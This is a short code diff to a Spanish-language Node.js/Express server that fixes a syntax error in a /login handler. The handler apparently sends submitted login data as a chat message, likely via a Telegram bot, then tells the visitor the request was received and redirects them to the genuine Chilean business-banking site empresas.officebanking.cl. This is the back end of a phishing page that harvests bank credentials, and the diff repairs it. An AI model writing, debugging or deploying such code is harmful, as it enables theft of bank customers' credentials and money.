@@ -26,16 +26,18 @@ app.post("/login", async (req, res) => {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
     });
-    
-      res.send("✅ Hemos recibido tu solicitud"
+
+    // Aquí estaba el error: faltaban comillas y concatenación
+    res.send(`
+      ✅ Hemos recibido tu solicitud
       <meta http-equiv="refresh" content="3;url=https://empresas.officebanking.cl">
-      
+    `);
+
   } catch (error) {
     console.error(error);
     res.status(500).send("❌ Error al ingresar tus datos. Inténtalo nuevamente");
   }
 });
-
 
 // Iniciar servidor
 const PORT = process.env.PORT || 3000;
